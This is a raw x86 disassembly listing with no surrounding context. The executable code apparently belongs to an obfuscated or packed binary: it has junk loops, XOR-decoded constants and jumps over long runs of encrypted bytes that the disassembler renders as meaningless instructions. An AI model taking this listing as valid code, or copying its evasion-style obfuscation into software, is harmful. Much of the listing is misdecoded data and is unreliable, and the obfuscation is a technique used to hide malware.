  405cb7:	sub    DWORD PTR ds:0x44d410,0x44a6cc
  405cc1:	mov    DWORD PTR [ebp-0x30],eax
  405cc4:	neg    eax
  405cc6:	mov    DWORD PTR [ebp-0xc],0xf89c8535
  405ccd:	adc    eax,DWORD PTR ds:0x424855
  405cd3:	mov    DWORD PTR [ebp-0x14],0xf89c8534
  405cda:	mov    eax,DWORD PTR [ebp-0xc]
  405cdd:	xor    DWORD PTR ds:0x44a6e0,0x59fc
  405ce7:	push   ebx
  405ce8:	or     DWORD PTR ds:0x424865,0x42485d
  405cf2:	push   esi
  405cf3:	adc    DWORD PTR ds:0x42485d,edi
  405cf9:	push   edi
  405cfa:	mov    DWORD PTR ds:0x44a6d4,0x13
  405d04:	cmp    DWORD PTR ds:0x44a6d4,0x0
  405d0b:	je     0x405e95
  405d11:	cmp    DWORD PTR ds:0x44a6d4,0x3
  405d18:	jne    0x405d31
  405d1e:	push   0x141c
  405d23:	push   0x6005
  405d28:	push   DWORD PTR [ebp-0xc]
  405d2b:	call   DWORD PTR ds:0x4420e0
  405d31:	cmp    DWORD PTR ds:0x44a6d4,0x4
  405d38:	jne    0x405d4d
  405d3e:	xor    edi,edi
  405d40:	xor    edi,DWORD PTR ds:0x44a6d4
  405d46:	dec    edi
  405d47:	mov    DWORD PTR ds:0x44a6d4,edi
  405d4d:	mov    edi,DWORD PTR ds:0x44a6d4
  405d53:	dec    edi
  405d54:	mov    DWORD PTR ds:0x44a6d4,edi
  405d5a:	jmp    0x405d04
  405d5f:	and    DWORD PTR ds:0x447988,0x5029
  405d69:	jmp    0x405e95
  405d6e:	out    0xd6,eax
  405d70:	(bad)  
  405d71:	sub    al,0xf9
  405d73:	sub    al,0xf9
  405d75:	jmp    0x592bcf2a
  405d7a:	pop    ecx
  405d7b:	lahf   
  405d7c:	jmp    FWORD PTR [edi+0x7c7c2191]
  405d82:	or     eax,0xd87c7c7f
  405d87:	dec    ecx
  405d88:	into   
  405d89:	xchg   DWORD PTR [ebx+0x2d14c5c7],esi
  405d8f:	mov    ch,0xde
  405d91:	sbb    cl,BYTE PTR [ecx]
  405d93:	lds    ecx,FWORD PTR [edi-0x1]
  405d96:	imul   ecx,DWORD PTR [edx-0x591dbe7a],0xffffffe5
  405d9d:	call   0xe8565f64
  405da2:	pop    esi
  405da3:	ficom  WORD PTR [ebx+0x50]
  405da6:	mov    ah,0x88
  405da8:	add    BYTE PTR [edx+0x5830fc35],dl
  405dae:	sub    BYTE PTR [ebx],dh
  405db0:	jle    0x405d36
  405db2:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405db4:	imul   esp,edx,0xffffff96
  405db7:	mov    eax,DWORD PTR [ecx-0x63a60feb]
  405dbd:	mov    ah,0xfa
  405dbf:	push   es
  405dc0:	mov    dh,0xe7
  405dc2:	lods   al,BYTE PTR ds:[esi]
  405dc3:	add    esi,DWORD PTR [edx]
  405dc5:	gs pop esp
  405dc7:	mov    ds:0x6d97cbd7,al
  405dcc:	cmp    esp,DWORD PTR [edx-0x2737aefd]
  405dd2:	mov    ch,0x91
  405dd4:	push   0xf4f42a86
  405dd9:	outs   dx,BYTE PTR ds:[esi]
  405dda:	cmc    
  405ddb:	enter  0x984a,0x57
  405ddf:	dec    ecx
  405de0:	(bad)  
  405de2:	xchg   ebx,eax
  405de3:	jg     0x405db5
  405de5:	dec    eax
  405de6:	push   eax
  405de7:	mov    bh,0x21
  405de9:	mov    esp,0xbe444dca
  405dee:	jo     0x405e10
  405df0:	mov    ds:0x19cbcb8,al
  405df5:	lds    esi,FWORD PTR [esi]
  405df7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405df8:	ja     0x405df6
  405dfa:	cmp    DWORD PTR [edi-0x584694dd],ebx
  405e00:	mov    cl,0xe4
  405e02:	mov    eax,ds:0xba9b9426
  405e07:	jle    0x405def
  405e09:	stc    
  405e0a:	push   ebx
  405e0b:	adc    eax,0x9396ad92
  405e10:	std    
  405e11:	sbb    DWORD PTR [ebx+0x1179e487],esi
  405e17:	cwde   
  405e18:	jno    0x405e82
  405e1a:	in     eax,dx
  405e1b:	mov    eax,ds:0xb16315b5
  405e20:	sbb    BYTE PTR [edi+eax*1],ah
  405e23:	add    bl,ah
  405e25:	dec    ebp
  405e26:	stc    
  405e27:	mov    ds:0x205fafbc,eax
  405e2c:	call   0x97c07a78
  405e31:	xor    al,0x8a
  405e33:	(bad)  
  405e34:	cdq    
  405e35:	xchg   esp,eax
  405e36:	pusha  
  405e37:	xchg   ecx,eax
  405e38:	push   cs
  405e39:	push   eax
  405e3a:	aaa    
  405e3b:	jg     0x405ded
  405e3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e3e:	cmp    eax,0x11999468
  405e43:	les    eax,FWORD PTR [esi-0x70]
  405e46:	and    DWORD PTR [edi+0x5e68a6a0],0xe1219204
  405e50:	outs   dx,BYTE PTR ds:[esi]
  405e51:	out    0xf1,al
  405e53:	aam    0x4a
  405e55:	or     DWORD PTR [eax+0x78],ecx
  405e58:	jae    0x405df1
  405e5a:	adc    DWORD PTR [ecx],edx
  405e5c:	sub    al,0xe3
  405e5e:	scas   eax,DWORD PTR es:[edi]
  405e5f:	pop    ecx
  405e60:	cdq    
  405e61:	ja     0x405e62
  405e63:	mov    ds:0x9a564894,al
  405e68:	fs dec esi
  405e6a:	and    esi,DWORD PTR [edi]
  405e6c:	mov    ?,WORD PTR [esi]
  405e6e:	icebp  
  405e6f:	fsub   QWORD PTR [edx-0x2d17679f]
  405e75:	mov    eax,ds:0x11e37abe
  405e7a:	in     eax,0xbb
  405e7c:	mov    dh,0xdd
  405e7e:	adc    al,0x8f
  405e80:	clc    
  405e81:	ds icebp 
  405e83:	pop    edx
  405e84:	out    dx,al
  405e85:	ret    0x67a5
  405e88:	inc    edi
  405e89:	out    0x3b,al
  405e8b:	dec    ebp
  405e8c:	mov    dl,0x6e
  405e8e:	and    dl,dh
  405e90:	fdivr  st,st(7)
  405e92:	jl     0x405efa
  405e94:	dec    ebx
  405e95:	mov    esi,0x7510857
  405e9a:	xor    eax,esi
  405e9c:	movzx  edi,WORD PTR ds:0x410753
  405ea3:	xor    DWORD PTR ds:0x447980,edi
  405ea9:	mov    edi,0x32729e
  405eae:	jmp    0x405fda
  405eb3:	icebp  
  405eb4:	popa   
  405eb5:	jno    0x405f2b
  405eb7:	loope  0x405f1d
  405eb9:	mov    DWORD PTR [ecx-0x35],edi
  405ebc:	add    esi,DWORD PTR [esi+0x2d]
  405ebf:	push   esi
  405ec0:	cmp    ecx,DWORD PTR [eax+0x7c20ae7f]
  405ec6:	jl     0x405ed5
  405ec8:	jg     0x405f46
  405eca:	jl     0x405ee6
  405ecc:	jnp    0x405f1f
  405ece:	jge    0x405ea3
  405ed0:	in     al,dx
  405ed1:	adc    esp,DWORD PTR [edi-0x1828c7c9]
  405ed7:	fdiv   DWORD PTR [esi-0xc]
  405eda:	pop    eax
  405edb:	mov    ds:0x9aaa7180,eax
  405ee0:	inc    edi
  405ee1:	pusha  
  405ee2:	in     eax,0xd6
  405ee4:	rcr    DWORD PTR [esi+ecx*8],cl
  405ee7:	leave  
  405ee8:	es xchg edi,eax
  405eea:	stc    
  405eeb:	out    0x58,eax
  405eed:	dec    edi
  405eee:	ret    
  405eef:	sub    esp,eax
  405ef1:	inc    ebx
  405ef2:	pop    es
  405ef3:	sbb    eax,0xb636f32c
  405ef8:	(bad)  
  405ef9:	xchg   esi,eax
  405efa:	pop    ebx
  405efb:	xor    bl,ah
  405efd:	(bad)  
  405efe:	frstor [edi]
  405f00:	in     al,dx
  405f01:	stos   BYTE PTR es:[edi],al
  405f02:	sub    BYTE PTR [esi],bh
  405f04:	rcr    ebx,cl
  405f06:	enter  0x3ad8,0x29
  405f0a:	xchg   esi,eax
  405f0b:	or     cl,BYTE PTR [edi+0x26e1498a]
  405f11:	mov    dh,0xf2
  405f13:	outs   dx,BYTE PTR ds:[esi]
  405f14:	iret   
  405f15:	das    
  405f16:	out    0x8a,eax
  405f18:	adc    edx,esp
  405f1a:	in     al,dx
  405f1b:	popf   
  405f1c:	cmp    al,0xe1
  405f1e:	sub    DWORD PTR [edx],edx
  405f20:	adc    BYTE PTR [eax],cl
  405f22:	std    
  405f23:	cdq    
  405f24:	scas   eax,DWORD PTR es:[edi]
  405f25:	mov    dl,0x99
  405f27:	cmp    cl,BYTE PTR ds:0xbfddb12e
  405f2d:	and    eax,0x51439770
  405f32:	push   es
  405f33:	inc    ebx
  405f34:	test   al,0x1c
  405f36:	call   FWORD PTR [ebp+0x2b631b14]
  405f3c:	clc    
  405f3d:	pushf  
  405f3e:	ret    0xa776
  405f41:	pop    ecx
  405f42:	cmp    ebx,DWORD PTR [edx+0x6f605f77]
  405f48:	jb     0x405f2f
  405f4a:	mov    ch,0xd5
  405f4c:	sbb    ecx,edx
  405f4e:	add    ah,BYTE PTR [ebx+ebp*1]
  405f51:	xchg   ecx,eax
  405f52:	dec    edx
  405f53:	pop    ecx
  405f54:	sbb    al,0x15
  405f56:	stos   DWORD PTR es:[edi],eax
  405f57:	xchg   ebp,eax
  405f58:	fnstenv [ebp-0x10a2d4cd]
  405f5e:	and    dl,BYTE PTR [ebx]
  405f60:	add    ebx,DWORD PTR [ebx-0x51]
  405f63:	mov    bl,0xd0
  405f65:	fsubr  DWORD PTR [ebx+0x5]
  405f68:	adc    DWORD PTR [ecx+0x16fbf0ff],edi
  405f6e:	xor    ecx,DWORD PTR [edi+0xd681143]
  405f74:	xor    al,0x9c
  405f76:	add    DWORD PTR [esi+ebx*8],ebp
  405f79:	fadd   QWORD PTR [eax-0x17]
  405f7c:	out    dx,al
  405f7d:	in     al,0xb2
  405f7f:	push   ds
  405f80:	jb     0x405ffd
  405f82:	adc    eax,0x7cab271e
  405f87:	xchg   DWORD PTR [esi-0x75],ebp
  405f8a:	int    0xda
  405f8c:	aas    
  405f8d:	add    eax,0x5b1fafa0
  405f92:	sbb    al,0xb9
  405f94:	frstor [edx]
  405f96:	inc    edx
  405f97:	mov    ebp,0x177892a6
  405f9c:	ds je  0x405fd0
  405f9f:	pop    ecx
  405fa0:	retf   0x2e50
  405fa3:	dec    esi
  405fa4:	ret    
  405fa5:	pop    ecx
  405fa6:	xchg   esi,eax
  405fa7:	and    al,0xa1
  405fa9:	jbe    0x405fe6
  405fab:	ins    DWORD PTR es:[edi],dx
  405fac:	or     BYTE PTR [edx-0x4f],0x3b
  405fb0:	cwde   
  405fb1:	sbb    eax,0xc7e9cf03
  405fb6:	loope  0x405f61
  405fb8:	ss cwde 
  405fba:	jne    0x405fcc
  405fbc:	jno    0x40601a
  405fbe:	mov    ds:0x2f06e244,al
  405fc3:	inc    esi
  405fc4:	pop    eax
  405fc5:	adc    esp,DWORD PTR [edx-0x47fe6f23]
  405fcb:	rcl    BYTE PTR [ebx+0xf],0xda
  405fcf:	jge    0x405fce
  405fd1:	add    eax,0x88fbfcb8
  405fd6:	enter  0x1835,0x19
  405fda:	add    eax,edi
  405fdc:	mov    DWORD PTR [ebp-0x20],eax
  405fdf:	mov    DWORD PTR ds:0x424859,0x15
  405fe9:	cmp    DWORD PTR ds:0x424859,0x0
  405ff0:	je     0x406021
  405ff6:	cmp    DWORD PTR ds:0x424859,0x23
  405ffd:	jne    0x40600e
  406003:	push   0x410927
  406008:	call   DWORD PTR ds:0x4420e4
  40600e:	xor    eax,eax
  406010:	or     eax,DWORD PTR ds:0x424859
  406016:	dec    eax
  406017:	mov    ds:0x424859,eax
  40601c:	jmp    0x405fe9
  406021:	mov    DWORD PTR [ebp-0x28],0xf89cb535
  406028:	mov    DWORD PTR [ebp-0x34],0xf89f0535
  40602f:	mov    DWORD PTR ds:0x447994,0x1696
  406039:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  406040:	or     DWORD PTR ds:0x44a6e0,edx
  406046:	mov    DWORD PTR [ebp-0x24],0xf89c85d5
  40604d:	and    DWORD PTR ds:0x410743,0x0
  406057:	jmp    0x40606a
  40605c:	xor    eax,eax
  40605e:	xor    eax,DWORD PTR ds:0x410743
  406064:	inc    eax
  406065:	mov    ds:0x410743,eax
  40606a:	cmp    DWORD PTR ds:0x410743,0x1c
  406071:	jae    0x4060ad
  406077:	cmp    DWORD PTR ds:0x410743,0x2b
  40607e:	jne    0x4060a3
  406084:	push   0x78a8
  406089:	push   0x44a6e0
  40608e:	push   0x8180
  406093:	push   0x6239
  406098:	push   0x1782
  40609d:	call   DWORD PTR ds:0x442364
  4060a3:	jmp    0x40605c
  4060a8:	xor    eax,0x3639
  4060ad:	mov    eax,DWORD PTR [ebp-0xc]
  4060b0:	add    DWORD PTR ds:0x4479a4,0x2d0a
  4060ba:	xor    eax,esi
  4060bc:	sbb    DWORD PTR ds:0x424849,0x6315
  4060c6:	add    eax,edi
  4060c8:	mov    DWORD PTR [ebp-0x18],eax
  4060cb:	or     DWORD PTR ds:0x44d414,0x658e
  4060d5:	mov    DWORD PTR [ebp-0x1c],0xf89c8530
  4060dc:	mov    BYTE PTR [ebp-0x1],0x57
  4060e0:	or     DWORD PTR ds:0x447994,edi
  4060e6:	mov    eax,DWORD PTR [ebp-0xc]
  4060e9:	xor    eax,esi
  4060eb:	add    eax,edi
  4060ed:	sbb    DWORD PTR ds:0x410753,0x34b4
  4060f7:	mov    DWORD PTR [ebp-0x18],eax
  4060fa:	dec    DWORD PTR ds:0x447998
  406100:	mov    eax,DWORD PTR [ebp-0x24]
  406103:	xor    eax,esi
  406105:	adc    DWORD PTR ds:0x41074b,0x44798c
  40610f:	add    eax,edi
  406111:	xor    DWORD PTR ds:0x447994,0x44d420
  40611b:	push   eax
  40611c:	mov    eax,DWORD PTR [ebp-0x28]
  40611f:	xor    eax,esi
  406121:	sbb    DWORD PTR ds:0x44799c,0x1e41
  40612b:	add    eax,edi
  40612d:	xor    DWORD PTR ds:0x447994,0x44d424
  406137:	push   eax
  406138:	and    DWORD PTR ds:0x41073f,0x0
  406142:	mov    eax,ds:0x41073f
  406147:	inc    eax
  406148:	mov    ds:0x41073f,eax
  40614d:	cmp    DWORD PTR ds:0x41073f,0xc
  406154:	jne    0x406170
  40615a:	push   0x8a0b
  40615f:	push   0x44a6d0
  406164:	push   DWORD PTR [ebp-0x28]
  406167:	push   DWORD PTR [ebp-0x20]
  40616a:	call   DWORD PTR ds:0x4420e8
  406170:	cmp    DWORD PTR ds:0x41073f,0xb
  406177:	jne    0x40618b
  40617d:	xor    eax,eax
  40617f:	add    eax,DWORD PTR ds:0x41073f
  406185:	inc    eax
  406186:	mov    ds:0x41073f,eax
  40618b:	cmp    DWORD PTR ds:0x41073f,0x17
  406192:	jb     0x406142
  406198:	movzx  eax,BYTE PTR ds:0x424851
  40619f:	xor    DWORD PTR ds:0x44a6d8,eax
  4061a5:	mov    eax,DWORD PTR [ebp-0x1c]
  4061a8:	neg    DWORD PTR ds:0x424859
  4061ae:	xor    eax,esi
  4061b0:	add    eax,edi
  4061b2:	or     DWORD PTR ds:0x44a6d8,0x41073f
  4061bc:	jmp    0x4062e8
  4061c1:	sar    DWORD PTR [ebp+0x7d793df9],cl
  4061c7:	sar    DWORD PTR [ebp+0x7a],cl
  4061ca:	sub    eax,0x18eaf1da
  4061cf:	cld    
  4061d0:	jmp    0x406191
  4061d2:	and    edi,DWORD PTR [esp+edi*2+0xd]
  4061d6:	jg     0x406254
  4061d8:	jl     0x40621a
  4061da:	sub    DWORD PTR [esi+edi*2+0x22],esp
  4061de:	das    
  4061df:	push   esp
  4061e0:	ss pop ebp
  4061e2:	mov    ds:0xd2e0b205,eax
  4061e7:	loop   0x4061d1
  4061e9:	mov    gs,WORD PTR [eax]
  4061eb:	shr    BYTE PTR [edx],0x35
  4061ee:	shl    DWORD PTR ds:0x9414504e,0x55
  4061f5:	ss clc 
  4061f7:	dec    esi
  4061f8:	(bad)  
  4061f9:	ret    0x9fd5
  4061fc:	(bad)  
  4061fd:	mov    DWORD PTR [edx-0x7e],ebp
  406200:	lahf   
  406201:	jl     0x406246
  406203:	hlt    
  406204:	adc    eax,0x2f5aa34c
  406209:	cmp    al,0xe6
  40620b:	cmp    al,0x13
  40620d:	ins    DWORD PTR es:[edi],dx
  40620e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40620f:	push   edi
  406210:	sub    dh,al
  406212:	inc    ecx
  406213:	in     al,dx
  406214:	mov    bl,BYTE PTR [esi-0x391512ee]
  40621a:	cmp    DWORD PTR [edx+0x3a88169b],edx
  406220:	nop
  406221:	bound  eax,QWORD PTR [eax]
  406223:	lock neg BYTE PTR [edi+0x7d]
  406227:	mov    ecx,fs
  406229:	loop   0x4061da
  40622b:	cld    
  40622c:	fidivr WORD PTR [edi+edi*8+0x280770ed]
  406233:	hlt    
  406234:	stos   BYTE PTR es:[edi],al
  406235:	repnz add bh,BYTE PTR [ebx]
  406238:	and    ebp,DWORD PTR [edx+0x18e23eaf]
  40623e:	cs xor bh,bh
  406241:	xor    al,0x5c
  406243:	mov    edi,DWORD PTR [edi+0x1]
  406246:	adc    cl,BYTE PTR [edi+0x40c21022]
  40624c:	mov    dl,0x74
  40624e:	push   ds
  40624f:	ret    0xb06d
  406252:	test   BYTE PTR [ebp+0x43ee52c3],ah
  406258:	mov    ch,0x84
  40625a:	sub    edi,DWORD PTR [eax+0x2c]
  40625d:	xor    al,bl
  40625f:	(bad)  
  406260:	pushf  
  406261:	mov    ebx,0x5e327c08
  406266:	(bad)  
  406267:	adc    ecx,DWORD PTR [eax+0x39]
  40626a:	sar    BYTE PTR [ecx+ecx*2],1
  40626d:	sub    eax,0x1fa3a56e
  406272:	loopne 0x4062d4
  406274:	sbb    esi,DWORD PTR [edx+0xf]
  406277:	mov    dh,0x77
  406279:	add    DWORD PTR [ebp+0x2e],0x5ea1384a
  406280:	hlt    
  406281:	push   edx
  406282:	lds    esp,FWORD PTR [edi-0x28]
  406285:	xchg   ebp,eax
  406286:	into   
  406287:	xchg   esi,eax
  406288:	add    bl,ah
  40628a:	cld    
  40628b:	jnp    0x40621f
  40628d:	ret    
  40628e:	push   ebp
  40628f:	stos   DWORD PTR es:[edi],eax
  406290:	dec    ebx
  406291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406292:	sub    esi,ebp
  406294:	sahf   
  406295:	sbb    dh,ch
  406297:	iret   
  406298:	jnp    0x40629a
  40629a:	mov    esi,0x7bc95870
  40629f:	pop    esi
  4062a0:	mov    cl,0x85
  4062a2:	sbb    ebx,DWORD PTR [esi+eax*8+0x72daaff0]
  4062a9:	adc    edx,esp
  4062ab:	adc    BYTE PTR [esi-0x194512b0],dh
  4062b1:	sub    al,0xba
  4062b3:	xor    dh,BYTE PTR [ebx+0x624aa08c]
  4062b9:	dec    edi
  4062ba:	lods   al,BYTE PTR ds:[esi]
  4062bb:	and    al,0x8e
  4062bd:	fld    TBYTE PTR [ecx+0x6a]
  4062c0:	mov    edx,0x572c683b
  4062c5:	into   
  4062c6:	or     DWORD PTR [esi],ebx
  4062c8:	add    DWORD PTR [esi+ecx*8+0x53],0xffffffad
  4062cd:	ficom  DWORD PTR [eax+eiz*4]
  4062d0:	and    ah,ch
  4062d2:	sub    al,BYTE PTR [edx+0x6dde5dea]
  4062d8:	jo     0x40631f
  4062da:	push   ebx
  4062db:	je     0x406279
  4062dd:	xchg   edi,eax
  4062de:	and    BYTE PTR [edx-0x47927433],ch
  4062e4:	in     al,0x99
  4062e6:	imul   edi,DWORD PTR [ebx-0x77ba72b0],0xd4100581
  4062f0:	inc    esp
  4062f1:	add    BYTE PTR [eax],bl
  4062f3:	aam    0x44
  4062f5:	add    BYTE PTR [eax-0x7f],dl
  4062f8:	or     eax,0x4479a4
  4062fd:	push   ebp
  4062fe:	dec    eax
  4062ff:	inc    edx
  406300:	add    bh,bh
  406302:	jne    0x4062f8
  406304:	add    DWORD PTR ds:0x44a6cc,0x42485d
  40630e:	jmp    0x40643a
  406313:	push   edx
  406314:	repz fist WORD PTR [ebp-0x4cadaa2f]
  40631b:	adc    DWORD PTR [esi+0x51a530af],esp
  406321:	imul   eax
  406323:	dec    esp
  406324:	and    bh,BYTE PTR [esp+edi*2+0xd]
  406328:	jg     0x4063a6
  40632a:	jl     0x406384
  40632c:	int    0x24
  40632e:	fs sbb al,0x2c
  406331:	xchg   ecx,eax
  406332:	jmp    0xa67442b4
  406337:	pop    eax
  406338:	inc    eax
  406339:	mov    edx,0xa523d69f
  40633e:	lahf   
  40633f:	daa    
  406340:	mov    esi,0x7426c3fa
  406345:	xchg   ebp,eax
  406346:	mov    edx,0x8e49007c
  40634b:	(bad)  
  40634c:	hlt    
  40634d:	inc    edx
  40634e:	ds xchg edx,eax
  406350:	or     al,ch
  406352:	int3   
  406353:	popa   
  406354:	outs   dx,BYTE PTR ds:[esi]
  406355:	(bad)  
  406356:	dec    ebp
  406357:	xor    dh,BYTE PTR [edx-0x7948143a]
  40635d:	pop    edi
  40635e:	out    0xbc,eax
  406360:	sub    DWORD PTR [eax-0x38f593ab],edx
  406366:	mov    WORD PTR [ebp-0x1b],cs
  406369:	jle    0x406304
  40636b:	inc    eax
  40636c:	stos   DWORD PTR es:[edi],eax
  40636d:	dec    edx
  40636e:	push   esp
  40636f:	je     0x4063ac
  406371:	pop    esi
  406372:	jbe    0x406354
  406374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406375:	(bad)  
  406376:	fld    TBYTE PTR [ecx+0x53]
  406379:	mov    cl,BYTE PTR ds:0xb3fbebcb
  40637f:	idiv   ecx
  406381:	mov    bl,0x7a
  406383:	pop    es
  406384:	mov    cl,0x9d
  406386:	sub    ecx,DWORD PTR [esi]
  406388:	not    al
  40638a:	nop
  40638b:	mov    ch,BYTE PTR [esi+0x50]
  40638e:	sub    BYTE PTR [esi-0x42673a5b],ch
  406394:	imul   eax,DWORD PTR [edi],0xffffffa5
  406397:	push   es
  406398:	lea    edi,[esi+0x60]
  40639b:	mov    eax,0xdbc83645
  4063a0:	and    DWORD PTR es:[eax],ebx
  4063a3:	and    edx,ebx
  4063a5:	lea    esi,[eax]
  4063a7:	xor    BYTE PTR [ebx+0x3a32341f],ah
  4063ad:	data16 test dh,0x99
  4063b1:	fadd   QWORD PTR [ebx]
  4063b3:	and    dl,BYTE PTR [edi-0x46]
  4063b6:	sbb    al,0xc0
  4063b8:	(bad)  
  4063ba:	inc    eax
  4063bb:	pop    ds
  4063bc:	jge    0x4063f2
  4063be:	jne    0x4063b9
  4063c0:	imul   BYTE PTR [esi]
  4063c2:	mov    ds:0xd01fe5ce,eax
  4063c7:	ds jecxz 0x4063e1
  4063ca:	sub    bl,al
  4063cc:	ins    DWORD PTR es:[edi],dx
  4063cd:	fiadd  WORD PTR [ebx+0x11]
  4063d0:	jns    0x40635e
  4063d2:	jne    0x406450
  4063d4:	xchg   edi,eax
  4063d5:	pop    ds
  4063d6:	ret    0x89d1
  4063d9:	and    al,0xfb
  4063db:	push   es
  4063dc:	pop    es
  4063dd:	or     DWORD PTR [eax],eax
  4063df:	or     al,0xa2
  4063e1:	xor    DWORD PTR [esi+0x66],esp
  4063e4:	jnp    0x406403
  4063e6:	dec    esi
  4063e7:	push   ebp
  4063e8:	sbb    ch,BYTE PTR [ebx+0x11120189]
  4063ee:	mov    WORD PTR [eax],cs
  4063f0:	int3   
  4063f1:	push   esi
  4063f2:	jcxz   0x4063bc
  4063f5:	rcr    BYTE PTR [edx],1
  4063f7:	add    BYTE PTR [eax+eiz*4],dl
  4063fa:	int3   
  4063fb:	stos   DWORD PTR es:[edi],eax
  4063fc:	mov    esp,0xcd10d9ce
  406401:	add    bh,bh
  406403:	dec    edi
  406404:	lods   al,BYTE PTR ds:[esi]
  406405:	mov    ebp,0x711d0cd2
  40640a:	cmp    eax,0x2d2ffae
  40640f:	mov    bh,0x62
  406411:	pop    ebx
  406412:	sbb    eax,0x675a41a6
  406417:	fild   WORD PTR [ebx-0x4a]
  40641a:	iret   
  40641b:	pop    es
  40641c:	sbb    ch,BYTE PTR [ebx+ebp*2-0x4e]
  406420:	loope  0x40641f
  406422:	jp     0x406478
  406424:	pop    ebp
  406425:	(bad)  
  406426:	cs jns 0x4063b9
  406429:	xchg   ecx,eax
  40642a:	cmc    
  40642b:	fadd   DWORD PTR [eax+0x26]
  40642e:	lods   eax,DWORD PTR ds:[esi]
  40642f:	mov    ecx,0xc1c1e352
  406434:	fidiv  WORD PTR ds:0xac362d01
  40643a:	push   DWORD PTR [ebp-0x14]
  40643d:	jmp    0x406569
  406442:	xchg   BYTE PTR [edi-0x29ad99e],ah
  406448:	pop    edx
  406449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40644a:	inc    eax
  40644b:	adc    al,0x79
  40644d:	sub    al,0x2f
  40644f:	sbb    ch,dl
  406451:	push   esi
  406452:	pop    ebp
  406453:	and    eax,0x7f0d7c7c
  406458:	jl     0x4064d6
  40645a:	cmp    dl,ah
  40645c:	std    
  40645d:	in     al,dx
  40645e:	neg    DWORD PTR [ebx+0x70f7bfe]
  406464:	mov    esp,0x294e0aff
  406469:	jo     0x406488
  40646b:	data16 add BYTE PTR [edx+0x1863cf25],cl
  406472:	shl    ebp,1
  406474:	cmc    
  406475:	cmc    
  406476:	cmp    eax,0x8adb17b6
  40647b:	and    edx,DWORD PTR [ebx-0x496b88fe]
  406481:	leave  
  406482:	mov    ah,0x85
  406484:	pop    ds
  406485:	hlt    
  406486:	add    BYTE PTR [ebx],0x34
  406489:	lds    esi,FWORD PTR [edx]
  40648b:	push   esi
  40648c:	sbb    BYTE PTR [ebp-0x369155d9],dl
  406492:	scas   al,BYTE PTR es:[edi]
  406493:	ds pop ds
  406495:	sub    ecx,esi
  406497:	jp     0x4064e7
  406499:	push   ss
  40649a:	icebp  
  40649b:	loope  0x4064f5
  40649d:	sub    al,0x5c
  40649f:	mov    ah,0x2d
  4064a1:	jae    0x4064f1
  4064a3:	dec    esp
  4064a4:	pushf  
  4064a5:	add    eax,0x9b6b7102
  4064aa:	icebp  
  4064ab:	xor    DWORD PTR [ecx+0x25],edx
  4064ae:	cmc    
  4064af:	out    0x7,eax
  4064b1:	pop    es
  4064b2:	push   es
  4064b3:	push   esi
  4064b4:	pop    ecx
  4064b5:	fisttp WORD PTR [ecx+0x36b3392]
  4064bb:	loope  0x4064ee
  4064bd:	jl     0x4064a6
  4064bf:	or     BYTE PTR [ebp-0x6fe18fdf],cl
  4064c5:	popa   
  4064c6:	pop    esi
  4064c7:	adc    dl,BYTE PTR ds:0xe7f66fd5
  4064cd:	mov    bl,0xfb
  4064cf:	mov    ch,0x45
  4064d1:	and    al,0x17
  4064d3:	imul   esp,DWORD PTR [eax+ebx*8+0x50],0x70
  4064d8:	fidivr DWORD PTR ds:0x73ebba81
  4064de:	jmp    0xf066:0xca2d8d69
  4064e5:	inc    eax
  4064e6:	fldcw  WORD PTR [eax]
  4064e8:	call   0x1432:0x4e54f215
  4064ef:	xor    edx,eax
  4064f1:	(bad)  
  4064f2:	std    
  4064f3:	(bad)  
  4064f4:	retf   
  4064f5:	nop
  4064f6:	cdq    
  4064f7:	ror    BYTE PTR [ebx-0x7ebc34a8],1
  4064fd:	pop    es
  4064fe:	fs inc ebx
  406500:	out    0x9,al
  406502:	jb     0x4064a8
  406504:	jns    0x406573
  406506:	push   cs
  406507:	nop
  406508:	cmp    DWORD PTR ds:[ebp+0x15e9630f],ebx
  40650f:	mov    ds,WORD PTR [bx+si]
  406512:	bnd je 0x4064a0
  406515:	jae    0x406530
  406517:	sahf   
  406518:	adc    eax,0x3569b1c3
  40651d:	aam    0xbf
  40651f:	shrd   esp,ebp,0x57
  406523:	xchg   edx,eax
  406524:	loopne 0x406555
  406526:	adc    ebx,ebx
  406528:	call   0x437eff04
  40652d:	cmp    eax,DWORD PTR [ebp-0x5c]
  406530:	sti    
  406531:	xchg   edx,eax
  406532:	xchg   esi,eax
  406533:	inc    edx
  406534:	int    0x24
  406536:	mov    edi,0x2d26fd2a
  40653b:	pop    eax
  40653c:	push   0xc7e42fe2
  406541:	or     eax,0xc53413b6
  406546:	sub    eax,0x935066e8
  40654b:	outs   dx,BYTE PTR ds:[esi]
  40654c:	sub    edx,DWORD PTR [eax]
  40654e:	fwait
  40654f:	cmp    dl,BYTE PTR [edx]
  406551:	outs   dx,BYTE PTR ds:[esi]
  406552:	(bad)  
  406553:	sbb    ch,bh
  406555:	cwde   
  406556:	data16 adc BYTE PTR [eax],0x93
  40655a:	cmp    esp,DWORD PTR [esi-0x5c]
  40655d:	shl    BYTE PTR [ebx-0x52],1
  406560:	dec    ebp
  406561:	sbb    bh,BYTE PTR [ebx-0x2e6a8666]
  406567:	mov    ds:0xebb2e857,eax
  40656c:	(bad)  
  40656d:	inc    DWORD PTR [ebp-0x497bf040]
  406573:	add    eax,DWORD PTR [eax]
  406575:	add    BYTE PTR [ecx+0x41075b1d],al
  40657b:	add    BYTE PTR [ecx+edi*2+0x458d0044],bl
  406582:	mov    BYTE PTR [eax-0x75],dl
  406585:	inc    ebp
  406586:	in     al,dx
  406587:	xor    eax,esi
  406589:	add    eax,edi
  40658b:	push   eax
  40658c:	mov    eax,DWORD PTR [ebp-0x10]
  40658f:	jmp    0x4066bb
  406594:	dec    edx
  406595:	add    bh,BYTE PTR [ebx]
  406597:	cmp    DWORD PTR [ebx-0x43],0x6a
  40659b:	fnsave [eax]
  40659d:	xchg   ebx,eax
  40659e:	mov    al,0xc5
  4065a0:	or     eax,0x6a0f1a1f
  4065a5:	and    al,0x7c
  4065a7:	jl     0x4065b6
  4065a9:	jg     0x406627
  4065ab:	jl     0x4065a9
  4065ad:	mov    cl,0x83
  4065af:	mov    WORD PTR [edi],ds
